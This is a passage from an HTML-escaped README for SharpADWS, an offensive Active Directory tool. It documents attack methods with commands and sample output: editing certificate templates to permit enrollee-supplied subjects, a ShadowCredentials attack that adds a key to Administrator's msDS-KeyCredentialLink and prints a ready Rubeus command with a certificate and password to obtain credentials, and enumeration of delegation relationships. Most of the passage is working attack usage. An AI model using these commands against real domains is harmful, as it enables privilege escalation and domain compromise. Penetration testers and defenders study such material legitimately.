True&#xA;    Client Authentication           : True&#xA;    Enrollment Agent                : False&#xA;    Any Purpose                     : False&#xA;    Enrollee Supplies Subject       : True&#xA;    pKIExtendedKeyUsage             : Encrypting File System  Secure Email  Client Authentication&#xA;    msPKI-Certificate-Name-Flag     : ENROLLEE_SUPPLIES_SUBJECT  SUBJECT_ALT_REQUIRE_UPN  SUBJECT_ALT_REQUIRE_EMAIL  SUBJECT_REQUIRE_EMAIL  SUBJECT_REQUIRE_DIRECTORY_PATH&#xA;    msPkI-Enrollment-Flag           : INCLUDE_SYMMETRIC_ALGORITHMS  PUBLISH_TO_DS  AUTO_ENROLLMENT&#xA;    msPKI-Private-Key-Flag          : EXPORTABLE_KEY&#xA;    CA Permissions                  :&#xA;         Enrollment Rights          :&#xA;                                    : Domain Admins&#xA;                                    : Domain Users&#xA;                                    : Enterprise Admins&#xA;         Object Control Permissions :&#xA;             WriteDacl              :&#xA;                                    : Domain Admins&#xA;                                    : Enterprise Admins&#xA;             WriteOwner             :&#xA;                                    : Domain Admins&#xA;                                    : Enterprise Admins&#xA;             WriteProperty          :&#xA;                                    : Domain Admins&#xA;                                    : Enterprise Admins&#xA;                                    : Marcus&#xA;                                    : Domain Users&#xA;                                    &#xA;# ...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;**It should be noted that the &lt;code&gt;find&lt;/code&gt; of Certify Method must rely on the mapping cache that has been established through Cache Method. **&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;modify&lt;/code&gt; action of the Certify method allows you to modify the properties of the certificate template, such as turning on the &lt;code&gt;CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT&lt;/code&gt; flag or enabling Client Authentication, if you have write access to the target template:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe Certify -action modify -template User -enrolleeSuppliesSubject -clientAuth&#xA;&#xA;[*] Enable enrollee supplies subject for template User successfully!&#xA;[*] Enable client authentication for template User successfully!&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Whisker&lt;/h3&gt; &#xA;&lt;p&gt;The Whisker method is able to perform the lifecycle of a ShadowCredentials attack just like &lt;a href=&#34;https://github.com/eladshamir/Whisker&#34;&gt;Whisker&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;list&lt;/code&gt; action of the Whisker method can list the &lt;code&gt;msDS-KeyCredentialLink&lt;/code&gt; attribute value of the target account object:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe Whisker -action list -target DC01$&#xA;&#xA;[*] List deviced for DC01$:&#xA;[*]     DeviceID: c9fdae6b-f6a1-4880-a498-6dc89814e596    Creation Time: 2/13/2024 7:43:49 PM&#xA;[*]     DeviceID: ee48b31f-71b1-4821-b21e-1ca28fad2ae9    Creation Time: 2/13/2024 8:06:52 PM&#xA;[*]     DeviceID: 80c31faf-8b0b-4af6-8350-22de2d91a4fd    Creation Time: 2/13/2024 8:01:50 PM&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The Whisker method&#39;s &lt;code&gt;add&lt;/code&gt; action allows you to add a Key to the target account&#39;s &lt;code&gt;msDS-KeyCredentialLink&lt;/code&gt; property to perform a ShadowCredentials attack if you have write access:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe Whisker -action add -target Administrator -cert-pass Passw0rd&#xA;&#xA;[*] Certificate generaged&#xA;[*] KeyCredential generated with DeviceID 7d9e0151-5fd2-46d5-ac3d-dce8a71399f2&#xA;[*] Updated the msDS-KeyCredentialLink attribute successfully!&#xA;[*] You can now run Rubeus with the following syntax:&#xA;&#xA;      Rubeus.exe asktgt /user:Administrator /certificate:MIIJzwIBAzCCCYsGCSqGSIb3DQEHA&#xA;      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 /password:&#34;Passw0rd&#34; /domain:cor&#xA;      p.local /getcredentials /show&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Additionally, with &lt;code&gt;remove&lt;/code&gt; action you can provide &lt;code&gt;-device-id&lt;/code&gt; to remove the specified Key from the &lt;code&gt;msDS-KeyCredentialLink&lt;/code&gt; property of the target object:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus&amp;gt;SharpADWS.exe Whisker -action remove -target DC01$ -device-id c9fdae6b-f6a1-4880-a498-6dc89814e596&#xA;&#xA;[*] Found value to remove&#xA;[*] msDS-KeyCredentialLink value has been removed:&#xA;[*]     DeviceID: c9fdae6b-f6a1-4880-a498-6dc89814e596    Creation Time: 2/13/2024 7:43:49 PM&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;FindDelegation&lt;/h3&gt; &#xA;&lt;p&gt;The FindDelegation method can enumerate all delegation relationships in the current domain. This method has no redundant options or parameters:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\Marcus\desktop&amp;gt;SharpADWS.exe FindDelegation&#xA;&#xA;AccountName  AccountType  DelegationType                      DelegationRightsTo&#xA;-----------  -----------  ----------------------------------  ----------------------------------------------&#xA;DC01$        Computer     Unconstrained                       N/A&#xA;PENTEST$     Computer     Resource-Based Constrained          DC01$&#xA;WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local/corp.local&#xA;WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local&#xA;WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01&#xA;WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local/CORP&#xA;WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01/CORP&#xA;WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local/DomainDnsZones.corp.local&#xA;WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local/ForestDnsZones.corp.local&#xA;WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01.corp.local/corp.local&#xA;WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01.corp.local&#xA;WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01&#xA;WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01.corp.local/CORP&#xA;WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01/CORP&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Say it at the end&lt;/h2&gt; &#xA;&lt;p&gt;This project is completed by me independently, and there will inevitably be some bugs. Contributors are very welcome to submit issues to report bugs or propose new ideas to jointly improve the project!&lt;/p&gt;</summary>
  </entry>
</feed>